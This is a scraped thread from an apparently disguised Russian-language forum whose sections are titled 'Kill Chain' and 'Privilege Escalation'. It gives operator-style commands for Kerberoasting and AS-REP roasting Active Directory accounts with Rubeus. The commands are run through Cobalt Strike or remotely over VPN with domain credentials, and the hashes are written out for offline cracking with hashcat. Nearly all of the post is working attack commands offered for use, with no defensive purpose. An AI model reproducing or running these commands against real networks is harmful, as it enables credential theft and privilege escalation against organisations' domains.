@@ -1,0 +1,85 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Privilege Escalation »
+    Kerberoasting
+
+Kerberoasting
+Alter · 2 · 35
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        Просмотр профиля Личное сообщение (Оффлайн) 
+
+: Февраля 05, 2021, 11:49:06 am
+Записан
+
+Post
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #1 : Июля 01, 2021, 03:25:23 am
+Записан
+
+From cobalt >
+execute-assembly /home/user/txt/edu/Fast-Guide/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
+
+Из под впна своей машины:
+
+----
+
+Проводим атаку kerberoasting через впн с НЕ доменной тачки, имея впн креды
+kerberoast remote from non-domain machine with domain user creds:
+1. Rubeus.exe kerberoast /dc:wesads15.wes.local /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt /creduser:domain.local\username /credpassword:UserPass!
+
+Asreproast remote from non-domain machine with domain user creds:
+2. Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt /dc:dc.domain.local /creduser:domain.local\username /credpassword:UserPass!
+
+как видите мы делаем то же самое что и в обычной атаке, просто добавляем 3 новых атрибута:
+/dc: - указываем контроллер домена
+/creduser: - логин доменного пользака от которого мы запускаемся
+/credpassword: - пароль доменного пользака от которого мы запускаемся
+
+from @cybercat
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Privilege Escalation »
+    Kerberoasting
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
